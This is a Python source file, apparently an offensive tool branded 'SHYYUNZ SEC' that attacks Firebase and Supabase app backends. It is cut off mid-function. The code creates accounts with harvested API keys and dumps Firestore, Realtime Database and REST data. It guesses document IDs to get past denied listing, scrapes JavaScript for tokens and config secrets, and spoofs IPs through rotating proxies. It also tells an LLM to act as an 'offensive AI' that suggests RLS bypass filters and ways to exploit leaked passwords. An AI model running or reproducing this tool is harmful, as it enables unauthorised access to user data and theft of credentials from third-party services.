#!/usr/bin/env python3
import asyncio
import httpx
import json
import re
import time
import base64
from openai import OpenAI
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from rich.live import Live
from rich.align import Align
from rich.syntax import Syntax
import os
from typing import List, Optional, Set, Dict
from urllib.parse import urljoin, urlparse
import random
import string
import sys
from datetime import datetime
from rich.console import Console, Group
from rich.box import SIMPLE
import warnings
warnings.filterwarnings("ignore")

# --- CONFIGURAÇÃO VISUAL SHYYUNZ SEC ---
console = Console()

BANNER = """
[bold cyan]
 ██████╗██╗  ██╗██╗   ██╗██╗   ██╗███╗   ██╗███████╗
██╔════╝██║  ██║╚██╗ ██╔╝╚██╗ ██╔╝████╗  ██║╚══███╔╝
╚█████╗ ███████║ ╚████╔╝  ╚████╔╝ ██╔██╗ ██║  ███╔╝ 
 ╚═══██╗██╔══██║  ╚██╔╝    ╚██╔╝  ██║╚██╗██║ ███╔╝  
██████╔╝██║  ██║   ██║      ██║   ██║ ╚████║███████╗
╚═════╝ ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═══╝╚══════╝
[/bold cyan][bold magenta] ╔═════════════════════════════════════════════════════╗
 ║ [bold white]SHYYUNZ SEC - SUPABASE v2.0[/bold white]       ║
 ║ [dim]Shadow Ops & Ultimate Exploit Edition[/dim]   ║
 ╚═════════════════════════════════════════════════════╝[/bold magenta]
"""

BRANDED_BANNER = r"""
[bold cyan]
                  ___====-_  _-====___
            _--^^^#####//      \\#####^^^--_
         _-^##########// (    ) \\##########^-_
        -############//  |\^^/|  \\############-
      _/############//   (@::@)   \\############\_
     /#############((     \\//     ))#############\
    -###############\\    (oo)    //###############-
   -#################\\  / VV \  //#################-
  -###################\\/      \//###################-
 _#/|##########/\######(   /\   )######/\##########|\#_
 |/ |#/\#/\#/\/  \#/\##\  |  |  /#/\#/  \/\#/\#/\#| \|
 `  |/  V  V  `   V  \# \ |  | / #/  V   '  V  V  \|  '
     `   `  `      `   /  \_|  |_/  \   '      '  '   '
                     /            \\
                    |   [bold white]SHYYUNZ[/bold white]   |
                     \____________/
[/bold cyan]
"""

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Apple) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
]

def decode_jwt_payload(token: str, part: int = 1) -> str:
    """Decodifica partes de um JWT (0=Header, 1=Payload) sem verificar assinatura."""
    try:
        parts = token.split(".")
        if len(parts) < 2: return "{}"
        b64 = parts[part]
        # Adiciona padding se necessário
        missing_padding = len(b64) % 4
        if missing_padding:
            b64 += '=' * (4 - missing_padding)
        return base64.b64decode(b64).decode('utf-8', errors='ignore')
    except:
        return "{}"

class KnowledgeManager:
    def __init__(self, filename="sh_knowledge.json"):
        self.filename = filename
        self.data = self.load()
    def load(self):
        if os.path.exists(self.filename):
            try:
                with open(self.filename, "r") as f: return json.load(f)
            except: pass
        return {"tables": [], "rpcs": [], "buckets": []}
    def save(self):
        try:
            with open(self.filename, "w") as f: json.dump(self.data, f, indent=2)
        except: pass
    def learn(self, category: str, name: str):
        if name not in self.data[category]:
            self.data[category].append(name)
            self.save()

knowledge = KnowledgeManager()

class ConfigManager:
    """Gerencia as configurações locais do usuário (API Keys, etc)."""
    def __init__(self, filename=".sh_config.json"):
        # Usa caminho absoluto para garantir que salve sempre no mesmo lugar (pasta do usuário)
        self.filename = os.path.join(os.path.expanduser("~"), filename)
        self.config = self.load()

    def load(self):
        if os.path.exists(self.filename):
            try:
                with open(self.filename, "r") as f: return json.load(f)
            except: pass
        return {"gemini_api_key": None}

    def save(self):
        try:
            with open(self.filename, "w") as f: json.dump(self.config, f, indent=2)
        except: pass

    def get_api_key(self):
        key = self.config.get("ai_api_key")
        if key and (key.startswith("sk-") or key.startswith("AIzaSy")): return key
        return None

    def set_api_key(self, key: str):
        key = key.strip()
        if key.startswith("sk-") or key.startswith("AIzaSy"):
            self.config["ai_api_key"] = key
            self.save()
            return True
        return False

sh_config = ConfigManager()

class ShyyunzBrain:
    def __init__(self, api_key: str):
        # Configura cliente para ser compatível com OpenAI e Gemini (via endpoint compatível ou v1beta)
        if api_key.startswith("AIza"):
            # Se for Gemini, usa o host da Google que aceita a API Key via query param ou header compatível
            self.client = OpenAI(api_key=api_key, base_url="https://generativelanguage.googleapis.com/v1beta/openai/")
            self.model = 'gemini-1.5-flash' # Modelo rápido e econômico
        else:
            self.client = OpenAI(api_key=api_key)
            self.model = 'gpt-4o-mini'

    async def _chat(self, prompt: str) -> str:
        """Envia prompt para a OpenAI/Gemini com retry para rate limits."""
        try:
            # Detecta se é Gemini ou OpenAI pelo padrão da chave na inicialização ou no client
            # Se a chave começa com AIza, é do Google/Gemini
            response = await asyncio.to_thread(
                self.client.chat.completions.create,
                model=self.model,
                messages=[{"role": "system", "content": "Você é a SHYYUNZ BRAIN, uma IA ofensiva especializada em Red Team e BaaS Auditoring. Responda de forma direta, técnica e profissional em Português Brasil."}, 
                          {"role": "user", "content": prompt}],
                max_tokens=2000
            )
            return response.choices[0].message.content
        except Exception as e:
            err_str = str(e)
            if "429" in err_str:
                console.print("[dim][IA] Rate limit, aguardando 5s...[/dim]")
                await asyncio.sleep(5)
                # Retry...
                response = await asyncio.to_thread(self.client.chat.completions.create, model=self.model, messages=[{"role": "user", "content": prompt}])
                return response.choices[0].message.content
            # Se for erro de endpoint/modelo, avisa o usuário
            console.print(f"[dim][IA] Erro na comunicação com {self.model}: {err_str[:100]}...[/dim]")
            raise e

    async def analyze_data(self, table_name: str, data: List[Dict]):
        if not data: return "Nenhum dado para analisar."
        sample = json.dumps(data[:10], indent=2)
        prompt = f"Você é o Cérebro Analítico da SHYYUNZ SEC. Analise este DUMP da tabela '{table_name}'. Identifique:\n1. Dados Sensíveis (Senhas, Hashes, Tokens, E-mails de Admins)\n2. Nível de Impacto (Baixo, Médio, Crítico)\n3. Recomendações de Exploração\nResponda em PORTUGUÊS BRASIL.\n\nDADOS:\n{sample}"
        try:
            return await self._chat(prompt)
        except Exception as e: return f"[red]Erro IA: {e}[/red]"

    async def suggest_filters(self, table_name: str) -> List[str]:
        prompt = f"Sugira 3 filtros PostgREST para burlar RLS na tabela '{table_name}'. Apenas os filtros separados por vírgula, sem explicação."
        try:
            text = await self._chat(prompt)
            return [f.strip() for f in text.split(",") if "=" in f]
        except: return ["id=not.eq.0", "limit=1"]

class FirebaseAuditor:
    def __init__(self, project_id: str, api_key: Optional[str] = None):
        self.project_id = project_id.strip()
        self.api_key = api_key.strip() if api_key else None
        # Suporte a RTDB multi-region
        if ".firebasedatabase.app" in self.project_id:
             self.rtdb_url = f"https://{self.project_id}/.json"
        else:
             self.rtdb_url = f"https://{self.project_id}.firebaseio.com/.json"
             
        self.firestore_url = f"https://firestore.googleapis.com/v1/projects/{self.project_id.split('.')[0]}/databases/(default)/documents"
        self.storage_url = f"https://firebasestorage.googleapis.com/v0/b/{self.project_id.split('.')[0]}.appspot.com/o"
        self.results = []
        self.token = None

    async def try_anonymous_login(self):
        if not self.api_key:
            console.print("[yellow][!] API Key não fornecida. Impossível tentar Login Anônimo.[/yellow]")
            return False
        
        url = f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={self.api_key}"
        console.print(f"\n[bold cyan][*] Tentando Exploit: Firebase Anonymous Sign-in...[/bold cyan]")
        async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
            try:
                r = await client.post(url, json={"returnSecureToken": True})
                if r.status_code == 200:
                    self.token = r.json().get("idToken")
                    console.print("[bold green][!] SUCESSO! Login Anônimo efetuado. Token capturado.[/bold green]")
                    return True
                else:
                    console.print(f"[dim][-] Login Anônimo desativado ou falhou (Status {r.status_code}).[/dim]")
            except: pass
        return False

    async def try_password_login(self, email, password):
        if not self.api_key:
            console.print("[yellow][!] API Key necessária para login.[/yellow]")
            return False
        
        url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={self.api_key}"
        console.print(f"\n[bold cyan][*] Tentando Login Firebase: {email}...[/bold cyan]")
        async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
            try:
                r = await client.post(url, json={"email": email, "password": password, "returnSecureToken": True})
                if r.status_code == 200:
                    self.token = r.json().get("idToken")
                    console.print("[bold green][!] SUCESSO! Logado como usuário. Token capturado.[/bold green]")
                    return True
                else:
                    data = r.json()
                    msg = data.get("error", {}).get("message", "Erro desconhecido")
                    if "CONFIGURATION_NOT_FOUND" in msg:
                        console.print(f"[bold yellow][!] AVISO: O Provedor de Email/Senha está DESATIVADO neste projeto Firebase.[/bold yellow]")
                        console.print(f"[dim]    Dica: Tente o Secret Hunter ou verifique se há uma API paralela.[/dim]")
                    else:
                        console.print(f"[bold red][-] Falha no login (Status {r.status_code}): {msg}[/bold red]")
                    return False
            except Exception as e:
                console.print(f"[red][!] Erro no login: {e}[/red]")
        return False

    async def try_signup(self, email, password):
        if not self.api_key:
            console.print("[yellow][!] API Key necessária para criar conta.[/yellow]")
            return False
        
        url = f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={self.api_key}"
        console.print(f"\n[bold cyan][*] Tentando Criar Conta Firebase: {email}...[/bold cyan]")
        async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
            try:
                r = await client.post(url, json={"email": email, "password": password, "returnSecureToken": True})
                if r.status_code == 200:
                    self.token = r.json().get("idToken")
                    console.print("[bold green][!] SUCESSO! Conta criada e logada.[/bold green]")
                    console.print(f"[bold gold1][🔑] Bearer Token: {self.token}[/bold gold1]")
                    return True
                else:
                    data = r.json()
                    msg = data.get("error", {}).get("message", "Erro desconhecido")
                    if "CONFIGURATION_NOT_FOUND" in msg:
                        console.print(f"[bold yellow][!] AVISO: A Criação de Contas (Signup) está DESATIVADA neste projeto Firebase.[/bold yellow]")
                        console.print(f"[dim]    Dica: O site pode estar usando um backend customizado para registros.[/dim]")
                    else:
                        console.print(f"[bold red][-] Falha na criação (Status {r.status_code}): {msg}[/bold red]")
                    return False
            except Exception as e:
                console.print(f"[red][!] Erro no signup: {e}[/red]")
        return False

    async def try_update_password(self, new_password):
        if not self.token:
            console.print("[yellow][!] Você precisa estar logado para mudar a senha.[/yellow]")
            return False
        
        url = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={self.api_key}"
        console.print(f"\n[bold cyan][*] Tentando Atualizar Senha...[/bold cyan]")
        async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
            try:
                r = await client.post(url, json={"idToken": self.token, "password": new_password, "returnSecureToken": True})
                if r.status_code == 200:
                    self.token = r.json().get("idToken")
                    console.print("[bold green][!] SUCESSO! Senha atualizada e novo token capturado.[/bold green]")
                    return True
                else:
                    console.print(f"[bold red][-] Falha na atualização (Status {r.status_code}): {r.text}[/bold red]")
            except Exception as e:
                console.print(f"[red][!] Erro ao atualizar: {e}[/red]")
        return False

    async def try_delete_account(self):
        if not self.token:
            console.print("[yellow][!] Você precisa estar logado para excluir a conta.[/yellow]")
            return False
        confirm = input("[!] TEM CERTEZA que deseja EXCLUIR sua conta? (S/N): ").strip().upper()
        if confirm != "S": return False

        url = f"https://identitytoolkit.googleapis.com/v1/accounts:delete?key={self.api_key}"
        console.print(f"\n[bold red][*] Solicitando Exclusão de Conta...[/bold red]")
        async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
            try:
                r = await client.post(url, json={"idToken": self.token})
                if r.status_code == 200:
                    self.token = None
                    console.print("[bold green][!] SUCESSO! Conta excluída permanentemente.[/bold green]")
                    return True
                else:
                    console.print(f"[bold red][-] Falha na exclusão (Status {r.status_code}): {r.text}[/bold red]")
            except Exception as e:
                console.print(f"[red][!] Erro ao excluir: {e}[/red]")
        return False

    def _display_docs(self, col, docs):
        sample_t = Table(title=f"DUMP: {col} ({len(docs)} docs)", box=SIMPLE)
        sample_t.add_column("Document ID", style="cyan")
        sample_t.add_column("Data (Snippet)", style="white")
        for d in docs:
            # Firestore data is slightly nested in 'name' and 'fields'
            name = d.get("name", "").split("/")[-1]
            fields = str(d.get("fields", {}))[:100] + "..."
            sample_t.add_row(name, fields)
        console.print(sample_t)

    def _display_single_doc(self, col, doc_id, data):
        fields = data.get("fields", {})
        dt_table = Table(title=f"Doc: {col}/{doc_id}", box=ROUNDED, show_header=False)
        for k, v in fields.items():
            val = str(list(v.values())[0]) if v and isinstance(v, dict) else str(v)
            dt_table.add_row(f"[cyan]{k}[/cyan]", f"[white]{val[:100]}[/white]")
        console.print(dt_table)

    async def dump_collection(self, col_name):
        """Extrai TODOS os documentos de uma coleção com paginação do Firestore."""
        console.print(f"\n[bold magenta][*] Iniciando Dump Completo (Firestore): {col_name}...[/bold magenta]")
        all_docs = []
        page_token = None
        headers = {"Authorization": f"Bearer {self.token}"} if self.token else {}
        
        async with httpx.AsyncClient(headers=headers, timeout=20.0, verify=False) as client:
            while True:
                params = {"pageSize": 100}
                if page_token: params["pageToken"] = page_token
                
                try:
                    r = await client.get(f"{self.firestore_url}/{col_name}", params=params)
                    if r.status_code == 200:
                        data = r.json()
                        docs = data.get("documents", [])
                        all_docs.extend(docs)
                        page_token = data.get("nextPageToken")
                        console.print(f"  [dim][*] Capturados {len(all_docs)} documentos...[/dim]")
                        if not page_token or len(all_docs) >= 1000: break
                    else: break
                except: break

        if all_docs:
            table = Table(title=f"DUMP: {col_name}", box=SIMPLE)
            table.add_column("ID", style="cyan")
            table.add_column("Data (Resumo)", style="white")
            for doc in all_docs[:20]:
                doc_id = doc.get("name", "").split("/")[-1]
                fields = doc.get("fields", {})
                simple = {k: list(v.values())[0] for k, v in fields.items() if v}
                table.add_row(doc_id, json.dumps(simple, ensure_ascii=False)[:100] + "...")
            console.print(table)
            
            # Paginação de Exibição
            offset = 0
            page_size = 20
            while offset < len(all_docs):
                display_chunk = all_docs[offset : offset + page_size]
                self._display_docs(col_name, display_chunk)
                offset += page_size
                if offset < len(all_docs):
                    opt = input(f"\n[?] Exibir mais {min(page_size, len(all_docs)-offset)} de {len(all_docs)} registros? (S/N/T para todos): ").strip().upper()
                    if opt == "N": break
                    if opt == "T": page_size = len(all_docs) # Exibe o resto
            
            save = input("\n[?] Deseja salvar este dump completo em JSON? (S/N): ").strip().upper()
            if save == "S":
                custom_name = input(f"[?] Nome do arquivo (ENTER para 'dump_firestore_{col_name}_{int(time.time())}.json'): ").strip()
                fname = custom_name if custom_name else f"dump_firestore_{col_name}_{int(time.time())}.json"
                if not fname.endswith(".json"): fname += ".json"
                
                with open(fname, "w", encoding="utf-8") as f:
                    json.dump(all_docs, f, indent=2, ensure_ascii=False)
                console.print(f"[bold green][+] Dump salvo em: {fname}[/bold green]")

    async def scan_all(self):
        # Auto-try anonymous login se tiver API Key e nenhum token
        if self.api_key and not self.token:
            console.print("[dim][*] Nenhuma sessão ativa. Tentando Login Anônimo automático...[/dim]")
            await self.try_anonymous_login()

        console.print(f"\n[bold yellow]>>> AUDITORIA FIREBASE: {self.project_id} <<<[/bold yellow]")
        headers = {}
        if self.token:
            headers["Authorization"] = f"Bearer {self.token}"
            console.print(f"[bold green][*] Rodando scan com Autenticação (JWT)[/bold green]")
        else:
            console.print(f"[dim][*] Rodando scan sem autenticação...[/dim]")

        async with httpx.AsyncClient(headers=headers, timeout=10.0, verify=False) as client:
            # 1. Realtime Database
            try:
                r = await client.get(self.rtdb_url)
                if r.status_code == 200:
                    console.print("[bold red blink][!!!] VULN: Realtime Database Aberto![/bold red blink]")
                    data = r.json()
                    snippet = json.dumps(data, indent=2)[:500] + "..." if data else "{}"
                    console.print(Panel(snippet, title="RTDB Sample", border_style="red"))
                    self.results.append({"type": "RTDB", "status": "EXPOSTO", "url": self.rtdb_url, "data": data})
                elif r.status_code == 401:
                    console.print("[yellow][!] RTDB Protegido (401).[/yellow]")
                elif r.status_code == 404:
                    console.print("[dim][-] RTDB Desativado.[/dim]")
            except: pass

            # 2. Firestore Collections (Expandida com base na análise do RecargaBux)
            cols = ["users", "profiles", "configs", "admins", "settings", "orders", "chats", "logs", "products", "sales", "payments", "stocks", "categories", "coupons"]
            console.print("\n[bold cyan][*] Scanning Firestore Collections...[/bold cyan]")
            
            # IDs de Alvos Específicos (Bypass de 'List' bloqueado)
            target_ids = [
                "admin", "root", "config", "settings", "public", "global", "system", "default",
                "PASCOA", "PROMO", "VIP", "1", "2", "3", "4", "5" # IDs comuns e Cupons
            ]
            # Adiciona IDs numéricos dinâmicos para produtos/vendas
            target_ids += [str(i) for i in range(25)]
            
            if self.token:
                try:
                    p_raw = decode_jwt_payload(self.token)
                    p_data = json.loads(p_raw)
                    uid = p_data.get("user_id") or p_data.get("sub")
                    if uid:
                        target_ids.insert(0, uid)
                        console.print(f"[dim][*] UID detectado no Token: {uid}[/dim]")
                except Exception as e:
                    console.print(f"[dim][!] Erro ao decodificar UID do token: {e}[/dim]")

            from rich.progress import Progress, SpinnerColumn, TextColumn
            with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), transient=True) as progress:
                scan_task = progress.add_task("[cyan]Explorando Firestore...", total=len(cols))
                
                for col in cols:
                    progress.update(scan_task, description=f"[cyan]Escaneando: {col}...")
                    try:
                        fr = await client.get(f"{self.firestore_url}/{col}")
                        if fr.status_code == 200:
                            console.print(f"  [bold red][!] Firestore LISTA EXPOSTA: {col}[/bold red]")
                            data = fr.json()
                            docs = data.get("documents", [])
                            if docs: self._display_docs(col, docs)
                            self.results.append({"type": "FIRESTORE", "name": col, "status": "EXPOSTO", "documents": docs})
                        elif fr.status_code == 403:
                            # Tenta Leitura Direta (Bypass) e Sub-coleções
                            found_any = False
                            for tid in target_ids:
                                dr = await client.get(f"{self.firestore_url}/{col}/{tid}")
                                if dr.status_code == 200:
                                    console.print(f"    [bold red blink][!!!] DOC DESCOBERTO: {col}/{tid}[/bold red blink]")
                                    d_data = dr.json()
                                    self._display_single_doc(col, tid, d_data)
                                    self.results.append({"type": "FIRESTORE_DOC", "path": f"{col}/{tid}", "data": d_data})
                                    found_any = True
                                    
                                    # Inteligência Extrema: Se achou o seu UID ou admin, tenta sub-coleções comuns
                                    if tid == uid or tid == "wfxFQ1co0gVvs2t9QVNKqD6FQBk2":
                                        sub_cols = ["data", "config", "settings", "profile", "private", "orders", "history"]
                                        for sc in sub_cols:
                                            scr = await client.get(f"{self.firestore_url}/{col}/{tid}/{sc}")
                                            if scr.status_code == 200:
                                                console.print(f"      [bold magenta][+] SUB-COL DESCOBERTA: {col}/{tid}/{sc}[/bold magenta]")
                                                s_data = scr.json()
                                                self.results.append({"type": "SUB_COL", "path": f"{col}/{tid}/{sc}", "data": s_data})

                            if not found_any:
                                console.print(f"  [yellow][-] Coleção Protegida: {col} (403)[/yellow]")
                        elif fr.status_code == 404:
                            pass # Silencioso para não poluir
                        else:
                            console.print(f"  [dim][?] {col}: Status {fr.status_code}[/dim]")
                    except Exception as e:
                        console.print(f"  [dim][!] Erro em {col}: {type(e).__name__}[/dim]")
                    progress.advance(scan_task)

            # 3. Google Storage
            try:
                sr = await client.get(self.storage_url)
                if sr.status_code == 200:
                    console.print(f"[bold red blink][!!!] VULN: Firebase Storage Aberto! {self.project_id}.appspot.com[/bold red blink]")
                    self.results.append({"type": "STORAGE", "status": "EXPOSTO"})
                else:
                    console.print(f"[dim][-] Storage Protegido ou Privado.[/dim]")
            except: pass

class AdvancedAuditor:
    def __init__(self, base_url: str, bearer: Optional[str] = None):
        if not base_url.startswith("http"): base_url = "https://" + base_url
        
        # Inteligência: Se a URL aponta para um recurso específico (ex: /pages), tenta pegar a raiz da API
        p = urlparse(base_url)
        path = p.path
        if "/api/" in path:
            api_root = path.split("/api/")[0] + "/api/"
            # Reconstrói se netloc for válido
            if p.netloc:
                base_url = f"{p.scheme}://{p.netloc}{api_root}"
        
        self.base_url = base_url if base_url.endswith("/") else base_url + "/"
        
        self.bearer = bearer.strip() if bearer else None
        self.headers = {"Content-Type": "application/json", "User-Agent": random.choice(USER_AGENTS)}
        if self.bearer:
            self.headers["Authorization"] = f"Bearer {self.bearer}"
        self.results = {"fuzz": [], "jwt": None, "discovered_secrets": []}

    async def fuzz_endpoints(self):
        common_paths = [
            "api/admin", "api/v1/admin", "api/users", "api/v1/users",
            "api/config", "api/v1/config", "api/settings", "api/debug",
            "api/status", "api/health", "api/auth/me", "api/profile",
            "api/db", "api/dump", "api/backup", "api/logs",
            "admin", "dashboard", "api/v1/profiles", "api/v2/users",
            "api/products", "api/v1/products", "api/orders",
            "api/v1/categories", "api/v1/branches", "api/v1/pages", "api/v1/settings/discord-webhooks"
        ]
        console.print(f"\n[bold green]>>> FUZZING ENDPOINTS: {self.base_url} <<<[/bold green]")
        
        async with httpx.AsyncClient(headers=self.headers, timeout=10.0, verify=False, follow_redirects=True) as client:
            # 404 Signature Check
            try:
                r_404 = await client.get(urljoin(self.base_url, f"shy_probe_{random.randint(1000,9999)}"))
                sig_len = len(r_404.text)
                sig_status = r_404.status_code
            except:
                sig_len, sig_status = -1, 404

            for path in common_paths:
                url = urljoin(self.base_url, path)
                try:
                    r = await client.get(url)
                    status = r.status_code
                    # Só considera se não for igual à assinatura de 404
                    if status != 404 and (status != sig_status or abs(len(r.text) - sig_len) > 50):
                        color = "green" if status == 200 else "yellow"
                        console.print(f"  [{color}][+] Found: {url} ({status})[/{color}]")
                        self.results["fuzz"].append({"url": url, "status": status})
                except: pass

    async def secret_hunter(self, url: str):
        if not url.startswith("http"): url = "https://" + url
        console.print(f"\n[bold cyan][*] Shadow Secret Hunter: Analisando {url}...[/bold cyan]")
        async with httpx.AsyncClient(headers={"User-Agent": random.choice(USER_AGENTS)}, timeout=10.0, verify=False, follow_redirects=True) as client:
            try:
                r = await client.get(url)
                if r.status_code == 403:
                    console.print(f"[bold red][!] BLOQUEIO DE WAF (403):[/bold red] O Hunter foi impedido de analisar {url}.")
                    console.print(f"[dim][*] Dica: Tente extrair tokens e segredos manualmente no Browser e use a opção [S] do menu.[/dim]")
                    return
                if r.status_code == 200:
                    html = r.text
                    scripts = re.findall(r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']', html)
                    preloads = re.findall(r'<link[^>]+rel=["\']modulepreload["\'][^>]*?href=["\']([^"\']+\.js[^"\']*)["\']', html)
                    js_urls = list(set([urljoin(url, s) for s in scripts + preloads] + [url]))
                    console.print(f"  [dim][*] Localizados {len(js_urls)} arquivos para análise...[/dim]")
                    for target_url in js_urls:
                        try:
                            tr = await client.get(target_url, timeout=10.0)
                            if tr.status_code == 200:
                                content = tr.text
                                jwts = re.findall(r'eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*', content)
                                for j in set(jwts):
                                    if len(j) > 60:
                                        console.print(f"  [bold gold1][!] TOKEN JWT: {j[:15]}...{j[-10:]}[/bold gold1]")
                                        self.results["discovered_secrets"].append({"type": "JWT", "value": j, "source": target_url})
                                configs = re.findall(r'(apiKey|projectId|authDomain|storageBucket)["\']?\s*[:=]\s*["\']([^"\']+)["\']', content)
                                for k, v in configs:
                                    console.print(f"  [bold green][+] CONFIG: {k} = {v}[/bold green]")
                                    self.results["discovered_secrets"].append({"type": "Config", "key": k, "value": v, "source": target_url})
                        except: pass
            except Exception as e:
                console.print(f"[red][!] Erro no Hunter: {e}[/red]")

    def analyze_jwt(self, token: str):
        try:
            header = json.loads(decode_jwt_payload(token, 0))
            payload = json.loads(decode_jwt_payload(token, 1))
            
            if not payload or payload == {}:
                return "[red]Erro: Payload vazio ou inválido.[/red]"
            
            self.results["jwt"] = {"header": header, "payload": payload}
            
            report = Table(title="JWT - ANALYZE", box=SIMPLE)
            report.add_column("Campo", style="cyan")
            report.add_column("Valor", style="magenta")
            
            for k, v in payload.items():
                report.add_row(str(k), str(v))
            
            # Auto-formata URL do Supabase para facilitar cópia/cola
            if payload.get("iss") == "supabase" and payload.get("ref"):
                ref = payload.get("ref")
                sb_url = f"https://{ref}.supabase.co"
                report.add_row("[bold cyan]Supabase URL[/bold cyan]", f"[bold yellow]{sb_url}[/bold yellow]")
            
            # Auto-formata URL do Shopify para facilitar cópia/cola
            if payload.get("shop"):
                shop = payload.get("shop")
                shop_url = f"https://{shop}" if not shop.startswith("http") else shop
                report.add_row("[bold cyan]Shopify Store[/bold cyan]", f"[bold yellow]{shop_url}[/bold yellow]")
                # Adiciona flag para o fuzzer se for Shopify
                self.results["platform"] = "shopify"
            
            alerts = []
            if payload.get("role") in ["admin", "root"] or payload.get("is_admin"):
                alerts.append("[bold red][!!!] IMPACTO: Role Privilegiada Detectada![/bold red]")
            if payload.get("exp"):
                exp_date = datetime.fromtimestamp(payload["exp"]).strftime('%Y-%m-%d %H:%M:%S')
                alerts.append(f"[dim][*] Expira em: {exp_date}[/dim]")
            
            return Group(report, *alerts)
        except Exception as e:
            return f"[red]Erro ao decodificar JWT: {e}[/red]"

    async def dump_api_data(self, endpoint_url: str):
        """Tenta extrair dados de um endpoint REST genérico."""
        console.print(f"\n[bold magenta][*] Iniciando Dump de API: {endpoint_url}...[/bold magenta]")
        async with httpx.AsyncClient(headers=self.headers, timeout=20.0, verify=False) as client:
            try:
                r = await client.get(endpoint_url)
                if r.status_code == 200:
                    try:
                        data = r.json()
                        console.print(Panel(json.dumps(data, indent=2, ensure_ascii=False)[:2000] + "...", title="API DATA DUMP"))
                        
                        save = input("\n[?] Deseja salvar este dump de API em JSON? (S/N): ").strip().upper()
                        if save == "S":
                            custom_name = input(f"[?] Nome do arquivo (ENTER para 'dump_api_{int(time.time())}.json'): ").strip()
                            fname = custom_name if custom_name else f"dump_api_{int(time.time())}.json"
                            if not fname.endswith(".json"): fname += ".json"
                            
                            with open(fname, "w", encoding="utf-8") as f:
                                json.dump(data, f, indent=2, ensure_ascii=False)
                            console.print(f"[bold green][+] Dump salvo em: {fname}[/bold green]")
                    except:
                        console.print("[yellow][!] Resposta não é um JSON válido. Exibindo texto puro:[/yellow]")
                        console.print(Panel(r.text[:1000] + "...", title="RAW DATA"))
                else:
                    console.print(f"[red][-] Erro ao ler endpoint (Status {r.status_code})[/red]")
            except Exception as e:
                console.print(f"[red][!] Erro no dump de API: {e}[/red]")


class ShyyunzAuditor:
    def __init__(self, target: str, apikey: str, bearer: Optional[str] = None):
        self.project_ref = self.extract_project_ref(target)
        self.root_url = f"https://{self.project_ref}.supabase.co"
        self.base_url = f"{self.root_url}/rest/v1/"
        self.auth_url = f"{self.root_url}/auth/v1/"
        self.storage_url = f"{self.root_url}/storage/v1/"
        self.apikey = apikey.strip()
        self.bearer = bearer.strip() if bearer else self.apikey
        self.headers = {"apikey": self.apikey, "Authorization": f"Bearer {self.bearer}", "Content-Type": "application/json"}
        self.results = []
        self.graphql_discovered = set()
        self.semaphore = asyncio.Semaphore(60)
        self.hits_count = 0
        self.proxies = self.load_proxies()
        self.current_proxy = None

    def load_proxies(self):
        if os.path.exists("proxies.txt"):
            try:
                with open("proxies.txt", "r") as f: return [l.strip() for l in f if l.strip()]
            except: pass
        return []

    def rotate_headers(self):
        new_ua = random.choice(USER_AGENTS)
        fake_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        self.headers.update({"User-Agent": new_ua, "X-Forwarded-For": fake_ip})
        if self.proxies: self.current_proxy = random.choice(self.proxies)

    @staticmethod
    def extract_project_ref(target: str) -> str:
        if "supabase.co" in target:
            m = re.findall(r"https?://([a-z0-9-]+)\.supabase\.co", target)
            if m: return m[0]
        return target.replace("https://", "").replace("http://", "").split(".")[0]

    async def check_service_role(self):
        async with httpx.AsyncClient() as client:
            try:
                r = await client.get(f"{self.auth_url}admin/users", headers=self.headers, timeout=5.0)
                if r.status_code == 200: console.print("[bold red blink][!!!] CHAVE SERVICE_ROLE DETECTADA! [!!!][/bold red blink]")
            except: pass

    async def pre_scan_auth_check(self) -> bool:
        async with httpx.AsyncClient(timeout=10.0) as client:
            try:
                # Testa na raiz do REST v1 que deve retornar o OpenAPI spec (200) se a apikey for válida
                r = await client.get(self.base_url, headers=self.headers)
                if r.status_code == 401: 
                    console.print(f"[red][!] ERRO: 401 Unauthorized para o alvo {self.project_ref}[/red]")
                    console.print(f"[dim]    Dica: Verifique se a apikey e o token estão corretos.[/dim]")
                    
                    # CORREÇÃO: Prompt mais específico (Mudar API vs Inserir Bearer)
                    console.print("\n[bold yellow][!] Deseja agir sobre o Erro 401?[/bold yellow]")
                    console.print("  [1] Alterar API Key (anon)")
                    console.print("  [2] Inserir Bearer Token (JWT de Login)")
                    console.print("  [0] Ignorar e Prosseguir")
                    
                    opt = input("\n[SHY_AUTH] Escolha: ").strip()
                    if opt == "1":
                        nova_key = input("[🔑] Digite a nova API Key (anon): ").strip()
                        if nova_key:
                            self.apikey = nova_key
                            self.headers.update({"apikey": self.apikey})
                            console.print("[green][+] API Key atualizada! Re-testando...[/green]")
                            return await self.pre_scan_auth_check()
                    elif opt == "2":
                        jwt = input("[🔑] Digite o Bearer Token (JWT): ").strip()
                        if jwt:
                            self.bearer = jwt
